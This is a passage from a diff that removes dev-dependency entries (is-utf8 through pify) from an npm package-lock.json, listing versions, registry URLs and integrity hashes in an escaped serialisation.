""sha512-qgDYXFSR5WvEfuS5dMj6oTMEbrrSaM0CrFk2Yiq/gXnBvD9pMa2jGXxyhGLfvhZpuMZe18CJpFxAt3CRs42NMg==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-utf8"": {<\n>-      ""version"": ""0.2.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-utf8/-/is-utf8-0.2.1.tgz""<c><\n>-      ""integrity"": ""sha1-Sw2hRCEE0bM2NA6AeX6GXPOffXI=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""isarray"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/isarray/-/isarray-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-u5NdSFgsuhaMBoNJV6VKPgcSTxE=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""isexe"": {<\n>-      ""version"": ""2.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/isexe/-/isexe-2.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-6PvzdNxVb/iUehDcsFctYz8s+hA=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""istanbul"": {<\n>-      ""version"": ""0.4.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/istanbul/-/istanbul-0.4.5.tgz""<c><\n>-      ""integrity"": ""sha1-ZcfXPUxNqE1POsMQuRj7C4Azczs=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""abbrev"": ""1.0.9""<c><\n>-        ""async"": ""1.5.2""<c><\n>-        ""escodegen"": ""1.8.1""<c><\n>-        ""esprima"": ""2.7.3""<c><\n>-        ""glob"": ""5.0.15""<c><\n>-        ""handlebars"": ""4.0.11""<c><\n>-        ""js-yaml"": ""3.11.0""<c><\n>-        ""mkdirp"": ""0.5.1""<c><\n>-        ""nopt"": ""3.0.6""<c><\n>-        ""once"": ""1.4.0""<c><\n>-        ""resolve"": ""1.1.7""<c><\n>-        ""supports-color"": ""3.2.3""<c><\n>-        ""which"": ""1.3.0""<c><\n>-        ""wordwrap"": ""1.0.0""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""abbrev"": {<\n>-          ""version"": ""1.0.9""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/abbrev/-/abbrev-1.0.9.tgz""<c><\n>-          ""integrity"": ""sha1-kbR5JYinc4wl813W9jdSovh3YTU=""<c><\n>-          ""dev"": true<\n>-        }<c><\n>-        ""esprima"": {<\n>-          ""version"": ""2.7.3""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/esprima/-/esprima-2.7.3.tgz""<c><\n>-          ""integrity"": ""sha1-luO3DVd59q1JzQMmc9HDEnZ7pYE=""<c><\n>-          ""dev"": true<\n>-        }<c><\n>-        ""glob"": {<\n>-          ""version"": ""5.0.15""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/glob/-/glob-5.0.15.tgz""<c><\n>-          ""integrity"": ""sha1-G8k2ueAvSmA/zCIuz3Yz0wuLk7E=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""inflight"": ""1.0.6""<c><\n>-            ""inherits"": ""2.0.3""<c><\n>-            ""minimatch"": ""3.0.4""<c><\n>-            ""once"": ""1.4.0""<c><\n>-            ""path-is-absolute"": ""1.0.1""<\n>-          }<\n>-        }<c><\n>-        ""resolve"": {<\n>-          ""version"": ""1.1.7""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/resolve/-/resolve-1.1.7.tgz""<c><\n>-          ""integrity"": ""sha1-IDEU2CrSxe2ejgQRs5ModeiJ6Xs=""<c><\n>-          ""dev"": true<\n>-        }<c><\n>-        ""supports-color"": {<\n>-          ""version"": ""3.2.3""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/supports-color/-/supports-color-3.2.3.tgz""<c><\n>-          ""integrity"": ""sha1-ZawFBLOVQXHYpklGsq48u4pfVPY=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""has-flag"": ""1.0.0""<\n>-          }<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""js-base64"": {<\n>-      ""version"": ""2.4.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/js-base64/-/js-base64-2.4.3.tgz""<c><\n>-      ""integrity"": ""sha512-H7ErYLM34CvDMto3GbD6xD0JLUGYXR3QTcH6B/tr4Hi/QpSThnCsIp+Sy5FRTw3B0d6py4HcNkW7nO/wdtGWEw==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""js-tokens"": {<\n>-      ""version"": ""3.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/js-tokens/-/js-tokens-3.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-mGbfOVECEw449/mWvOtlRDIJwls=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""js-yaml"": {<\n>-      ""version"": ""3.11.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/js-yaml/-/js-yaml-3.11.0.tgz""<c><\n>-      ""integrity"": ""sha512-saJstZWv7oNeOyBh3+Dx1qWzhW0+e6/8eDzo7p5rDFqxntSztloLtuKu+Ejhtq82jsilwOIZYsCz+lIjthg1Hw==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""argparse"": ""1.0.10""<c><\n>-        ""esprima"": ""4.0.0""<\n>-      }<\n>-    }<c><\n>-    ""json-parse-better-errors"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/json-parse-better-errors/-/json-parse-better-errors-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha512-mrqyZKfX5EhL7hvqcV6WG1yYjnjeuYDzDhhcAAUrq8Po85NBQBJP+ZDUT75qZQ98IkUoBqdkExkukOU7Ts2wrw==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""json-stable-stringify"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/json-stable-stringify/-/json-stable-stringify-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-mnWdOcXy/1A/1TAGRu1EX4jE+a8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""jsonify"": ""0.0.0""<\n>-      }<\n>-    }<c><\n>-    ""json3"": {<\n>-      ""version"": ""3.3.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/json3/-/json3-3.3.2.tgz""<c><\n>-      ""integrity"": ""sha1-PAQ0dD35Pi9cQq7nsZvLSDV19OE=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""jsonify"": {<\n>-      ""version"": ""0.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/jsonify/-/jsonify-0.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-LHS27kHZPKUbe1qu6PUDYx0lKnM=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""jsonpointer"": {<\n>-      ""version"": ""4.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/jsonpointer/-/jsonpointer-4.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-T9kss04OnbPInIYi7PUfm5eMbLk=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""kind-of"": {<\n>-      ""version"": ""3.2.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/kind-of/-/kind-of-3.2.2.tgz""<c><\n>-      ""integrity"": ""sha1-MeohpzS6ubuw8yRm2JOupR5KPGQ=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""is-buffer"": ""1.1.6""<\n>-      }<\n>-    }<c><\n>-    ""lazy-cache"": {<\n>-      ""version"": ""1.0.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lazy-cache/-/lazy-cache-1.0.4.tgz""<c><\n>-      ""integrity"": ""sha1-odePw6UEdMuAhF07O24dpJpEbo4=""<c><\n>-      ""dev"": true<c><\n>-      ""optional"": true<\n>-    }<c><\n>-    ""levn"": {<\n>-      ""version"": ""0.3.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/levn/-/levn-0.3.0.tgz""<c><\n>-      ""integrity"": ""sha1-OwmSTt+fCDwEkP3UwLxEIeBHZO4=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""prelude-ls"": ""1.1.2""<c><\n>-        ""type-check"": ""0.3.2""<\n>-      }<\n>-    }<c><\n>-    ""linefix"": {<\n>-      ""version"": ""0.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/linefix/-/linefix-0.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-WB9UspNf++nfJVdw8Ko7A0E4I5M=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""load-json-file"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/load-json-file/-/load-json-file-1.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-lWkFcI1YtLq0wiYbBPWfMcmTdMA=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""graceful-fs"": ""4.1.11""<c><\n>-        ""parse-json"": ""2.2.0""<c><\n>-        ""pify"": ""2.3.0""<c><\n>-        ""pinkie-promise"": ""2.0.1""<c><\n>-        ""strip-bom"": ""2.0.0""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""strip-bom"": {<\n>-          ""version"": ""2.0.0""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/strip-bom/-/strip-bom-2.0.0.tgz""<c><\n>-          ""integrity"": ""sha1-YhmoVhZSBJHzV4i9vxRHqZx+aw4=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""is-utf8"": ""0.2.1""<\n>-          }<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""lodash"": {<\n>-      ""version"": ""4.17.10""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash/-/lodash-4.17.10.tgz""<c><\n>-      ""integrity"": ""sha512-UejweD1pDoXu+AD825lWwp4ZGtSwgnpZxb3JDViD7StjQz+Nb/6l093lx4OQ0foGWNRoc19mWy7BzL+UAK2iVg==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash._baseassign"": {<\n>-      ""version"": ""3.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash._baseassign/-/lodash._baseassign-3.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-jDigmVAPIVrQnlnxci/QxSv+Ck4=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""lodash._basecopy"": ""3.0.1""<c><\n>-        ""lodash.keys"": ""3.1.2""<\n>-      }<\n>-    }<c><\n>-    ""lodash._basecopy"": {<\n>-      ""version"": ""3.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash._basecopy/-/lodash._basecopy-3.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-jaDmqHbPNEwK2KVIghEd08XHyjY=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash._basecreate"": {<\n>-      ""version"": ""3.0.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash._basecreate/-/lodash._basecreate-3.0.3.tgz""<c><\n>-      ""integrity"": ""sha1-G8ZhYU2qf8MRt9A78WgGoCE8+CE=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash._getnative"": {<\n>-      ""version"": ""3.9.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash._getnative/-/lodash._getnative-3.9.1.tgz""<c><\n>-      ""integrity"": ""sha1-VwvH3t5G1hzc3mh9ZdPuy6o6r/U=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash._isiterateecall"": {<\n>-      ""version"": ""3.0.9""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash._isiterateecall/-/lodash._isiterateecall-3.0.9.tgz""<c><\n>-      ""integrity"": ""sha1-UgOte6Ql+uhCRg5pbbnPPmqsBXw=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash.create"": {<\n>-      ""version"": ""3.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash.create/-/lodash.create-3.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-1/KEnw29p+BGgruM1yqwIkYd6+c=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""lodash._baseassign"": ""3.2.0""<c><\n>-        ""lodash._basecreate"": ""3.0.3""<c><\n>-        ""lodash._isiterateecall"": ""3.0.9""<\n>-      }<\n>-    }<c><\n>-    ""lodash.isarguments"": {<\n>-      ""version"": ""3.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash.isarguments/-/lodash.isarguments-3.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-L1c9hcaiQon/AGY7SRwdM4/zRYo=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash.isarray"": {<\n>-      ""version"": ""3.0.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash.isarray/-/lodash.isarray-3.0.4.tgz""<c><\n>-      ""integrity"": ""sha1-eeTriMNqgSKvhvhEqpvNhRtfu1U=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash.keys"": {<\n>-      ""version"": ""3.1.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash.keys/-/lodash.keys-3.1.2.tgz""<c><\n>-      ""integrity"": ""sha1-TbwEcrFWvlCgsoaFXRvQsMZWCYo=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""lodash._getnative"": ""3.9.1""<c><\n>-        ""lodash.isarguments"": ""3.1.0""<c><\n>-        ""lodash.isarray"": ""3.0.4""<\n>-      }<\n>-    }<c><\n>-    ""lodash.tostring"": {<\n>-      ""version"": ""4.1.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash.tostring/-/lodash.tostring-4.1.4.tgz""<c><\n>-      ""integrity"": ""sha1-Vgwn0fjq3eA8LM4Zj+9cAx2CmPs=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""lodash.unescape"": {<\n>-      ""version"": ""4.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/lodash.unescape/-/lodash.unescape-4.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-Nt6/xJK4FHhHHvl0zTeD4gLrbO8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""lodash.tostring"": ""4.1.4""<\n>-      }<\n>-    }<c><\n>-    ""longest"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/longest/-/longest-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-MKCy2jj3N3DoKUoNIuZiXtd9AJc=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""loud-rejection"": {<\n>-      ""version"": ""1.6.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/loud-rejection/-/loud-rejection-1.6.0.tgz""<c><\n>-      ""integrity"": ""sha1-W0b4AUft7leIcPCG0Eghz5mOVR8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""currently-unhandled"": ""0.4.1""<c><\n>-        ""signal-exit"": ""3.0.2""<\n>-      }<\n>-    }<c><\n>-    ""map-obj"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/map-obj/-/map-obj-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-2TPOuSBdgr3PSIb2dCvcK03qFG0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""meow"": {<\n>-      ""version"": ""3.7.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/meow/-/meow-3.7.0.tgz""<c><\n>-      ""integrity"": ""sha1-cstmi0JSKCkKu/qFaJJYcwioAfs=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""camelcase-keys"": ""2.1.0""<c><\n>-        ""decamelize"": ""1.2.0""<c><\n>-        ""loud-rejection"": ""1.6.0""<c><\n>-        ""map-obj"": ""1.0.1""<c><\n>-        ""minimist"": ""1.2.0""<c><\n>-        ""normalize-package-data"": ""2.4.0""<c><\n>-        ""object-assign"": ""4.1.1""<c><\n>-        ""read-pkg-up"": ""1.0.1""<c><\n>-        ""redent"": ""1.0.0""<c><\n>-        ""trim-newlines"": ""1.0.0""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""minimist"": {<\n>-          ""version"": ""1.2.0""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/minimist/-/minimist-1.2.0.tgz""<c><\n>-          ""integrity"": ""sha1-o1AIsg9BOD7sH7kU9M1d95omQoQ=""<c><\n>-          ""dev"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""minimatch"": {<\n>-      ""version"": ""3.0.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/minimatch/-/minimatch-3.0.4.tgz""<c><\n>-      ""integrity"": ""sha512-yJHVQEhyqPLUTgt9B83PXu6W3rx4MvvHvSUvToogpwoGDOUQ+yDrR0HRot+yOCdCO7u4hX3pWft6kWBBcqh0UA==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""brace-expansion"": ""1.1.11""<\n>-      }<\n>-    }<c><\n>-    ""minimist"": {<\n>-      ""version"": ""0.0.8""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz""<c><\n>-      ""integrity"": ""sha1-hX/Kv8M5fSYluCKCYuhqp6ARsF0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""mkdirp"": {<\n>-      ""version"": ""0.5.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/mkdirp/-/mkdirp-0.5.1.tgz""<c><\n>-      ""integrity"": ""sha1-MAV0OOrGz3+MR2fzhkjWaX11yQM=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""minimist"": ""0.0.8""<\n>-      }<\n>-    }<c><\n>-    ""mocha"": {<\n>-      ""version"": ""3.5.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/mocha/-/mocha-3.5.3.tgz""<c><\n>-      ""integrity"": ""sha512-/6na001MJWEtYxHOV1WLfsmR4YIynkUEhBwzsb+fk2qmQ3iqsi258l/Q2MWHJMImAcNpZ8DEdYAK72NHoIQ9Eg==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""browser-stdout"": ""1.3.0""<c><\n>-        ""commander"": ""2.9.0""<c><\n>-        ""debug"": ""2.6.8""<c><\n>-        ""diff"": ""3.2.0""<c><\n>-        ""escape-string-regexp"": ""1.0.5""<c><\n>-        ""glob"": ""7.1.1""<c><\n>-        ""growl"": ""1.9.2""<c><\n>-        ""he"": ""1.1.1""<c><\n>-        ""json3"": ""3.3.2""<c><\n>-        ""lodash.create"": ""3.1.1""<c><\n>-        ""mkdirp"": ""0.5.1""<c><\n>-        ""supports-color"": ""3.1.2""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""debug"": {<\n>-          ""version"": ""2.6.8""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/debug/-/debug-2.6.8.tgz""<c><\n>-          ""integrity"": ""sha1-5zFTHKLt4n0YgiJCfaF4IdaP9Pw=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""ms"": ""2.0.0""<\n>-          }<\n>-        }<c><\n>-        ""glob"": {<\n>-          ""version"": ""7.1.1""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/glob/-/glob-7.1.1.tgz""<c><\n>-          ""integrity"": ""sha1-gFIR3wT6rxxjo2ADBs31reULLsg=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""fs.realpath"": ""1.0.0""<c><\n>-            ""inflight"": ""1.0.6""<c><\n>-            ""inherits"": ""2.0.3""<c><\n>-            ""minimatch"": ""3.0.4""<c><\n>-            ""once"": ""1.4.0""<c><\n>-            ""path-is-absolute"": ""1.0.1""<\n>-          }<\n>-        }<c><\n>-        ""supports-color"": {<\n>-          ""version"": ""3.1.2""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/supports-color/-/supports-color-3.1.2.tgz""<c><\n>-          ""integrity"": ""sha1-cqJiiU2dQIuVbKBf83su2KbiotU=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""has-flag"": ""1.0.0""<\n>-          }<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""ms"": {<\n>-      ""version"": ""2.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ms/-/ms-2.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-VgiurfwAvmwpAd9fmGF4jeDVl8g=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""mute-stream"": {<\n>-      ""version"": ""0.0.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/mute-stream/-/mute-stream-0.0.5.tgz""<c><\n>-      ""integrity"": ""sha1-j7+rsKmKJT0xhDMfno3rc3L6xsA=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""natural-compare"": {<\n>-      ""version"": ""1.4.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/natural-compare/-/natural-compare-1.4.0.tgz""<c><\n>-      ""integrity"": ""sha1-Sr6/7tdUHywnrPspvbvRXI1bpPc=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""next-tick"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/next-tick/-/next-tick-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-yobR/ogoFpsBICCOPchCS524NCw=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""nopt"": {<\n>-      ""version"": ""3.0.6""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/nopt/-/nopt-3.0.6.tgz""<c><\n>-      ""integrity"": ""sha1-xkZdvwirzU2zWTF/eaxopkayj/k=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""abbrev"": ""1.1.1""<\n>-      }<\n>-    }<c><\n>-    ""nopt-usage"": {<\n>-      ""version"": ""0.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/nopt-usage/-/nopt-usage-0.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-sYuMGD4YEEfKnmO3zefPxwLMpXk=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""normalize-package-data"": {<\n>-      ""version"": ""2.4.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/normalize-package-data/-/normalize-package-data-2.4.0.tgz""<c><\n>-      ""integrity"": ""sha512-9jjUFbTPfEy3R/ad/2oNbKtW9Hgovl5O1FvFWKkKblNXoN/Oou6+9+KKohPK13Yc3/TyunyWhJp6gvRNR/PPAw==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""hosted-git-info"": ""2.6.0""<c><\n>-        ""is-builtin-module"": ""1.0.0""<c><\n>-        ""semver"": ""5.5.0""<c><\n>-        ""validate-npm-package-license"": ""3.0.3""<\n>-      }<\n>-    }<c><\n>-    ""npm-license"": {<\n>-      ""version"": ""0.3.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/npm-license/-/npm-license-0.3.3.tgz""<c><\n>-      ""integrity"": ""sha1-9n9LwjyGP24GLN5jlBTgURbc24I=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""mkdirp"": ""0.5.1""<c><\n>-        ""nopt"": ""3.0.6""<c><\n>-        ""nopt-usage"": ""0.1.0""<c><\n>-        ""package-license"": ""0.1.2""<c><\n>-        ""pkginfo"": ""0.3.1""<c><\n>-        ""read-installed"": ""4.0.3""<c><\n>-        ""treeify"": ""1.0.1""<c><\n>-        ""underscore"": ""1.4.4""<\n>-      }<\n>-    }<c><\n>-    ""number-is-nan"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/number-is-nan/-/number-is-nan-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-CXtgK1NCKlIsGvuHkDGDNpQaAR0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""object-assign"": {<\n>-      ""version"": ""4.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/object-assign/-/object-assign-4.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-IQmtx5ZYh8/AXLvUQsrIv7s2CGM=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""once"": {<\n>-      ""version"": ""1.4.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/once/-/once-1.4.0.tgz""<c><\n>-      ""integrity"": ""sha1-WDsap3WWHUsROsF9nFC6753Xa9E=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""wrappy"": ""1.0.2""<\n>-      }<\n>-    }<c><\n>-    ""onetime"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""http://registry.npmjs.org/onetime/-/onetime-1.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-ofeDj4MUxRbwXs78vEzP4EtO14k=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""optimist"": {<\n>-      ""version"": ""0.6.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/optimist/-/optimist-0.6.1.tgz""<c><\n>-      ""integrity"": ""sha1-2j6nRob6IaGaERwybpDrFaAZZoY=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""minimist"": ""0.0.8""<c><\n>-        ""wordwrap"": ""0.0.3""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""wordwrap"": {<\n>-          ""version"": ""0.0.3""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/wordwrap/-/wordwrap-0.0.3.tgz""<c><\n>-          ""integrity"": ""sha1-o9XabNXAvAAI03I0u68b7WMFkQc=""<c><\n>-          ""dev"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""optionator"": {<\n>-      ""version"": ""0.8.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/optionator/-/optionator-0.8.2.tgz""<c><\n>-      ""integrity"": ""sha1-NkxeQJ0/TWMB1sC0wFu6UBgK62Q=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""deep-is"": ""0.1.3""<c><\n>-        ""fast-levenshtein"": ""2.0.6""<c><\n>-        ""levn"": ""0.3.0""<c><\n>-        ""prelude-ls"": ""1.1.2""<c><\n>-        ""type-check"": ""0.3.2""<c><\n>-        ""wordwrap"": ""1.0.0""<\n>-      }<\n>-    }<c><\n>-    ""os-homedir"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/os-homedir/-/os-homedir-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-/7xJiDNuDoM94MFox+8VISGqf7M=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""package-license"": {<\n>-      ""version"": ""0.1.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/package-license/-/package-license-0.1.2.tgz""<c><\n>-      ""integrity"": ""sha1-9cRJp6UPrfSiI0HilJCZ+RpCAos=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""parse-json"": {<\n>-      ""version"": ""2.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/parse-json/-/parse-json-2.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-9ID0BDTvgHQfhGkJn43qGPVaTck=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""error-ex"": ""1.3.1""<\n>-      }<\n>-    }<c><\n>-    ""path-exists"": {<\n>-      ""version"": ""2.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/path-exists/-/path-exists-2.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-D+tsZPD8UY2adU3V77YscCJ2H0s=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""pinkie-promise"": ""2.0.1""<\n>-      }<\n>-    }<c><\n>-    ""path-is-absolute"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/path-is-absolute/-/path-is-absolute-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-F0uSaHNVNP+8es5r9TpanhtcX18=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""path-is-inside"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/path-is-inside/-/path-is-inside-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-NlQX3t5EQw0cEa9hAn+s8HS9/FM=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""path-parse"": {<\n>-      ""version"": ""1.0.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/path-parse/-/path-parse-1.0.5.tgz""<c><\n>-      ""integrity"": ""sha1-PBrfhx6pzWyUMbbqK9dKD/BVxME=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""path-type"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/path-type/-/path-type-1.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-WcRPfuSR2nBNpBXaWkBwuk+P5EE=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""graceful-fs"": ""4.1.11""<c><\n>-        ""pify"": ""2.3.0""<c><\n>-        ""pinkie-promise"": ""2.0.1""<\n>-      }<\n>-    }<c><\n>-    ""pify"": {<\n>-      ""version"": ""2.3.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/pify/-/pify-2.3.0.tgz""<c><\n>-      ""integrity"": 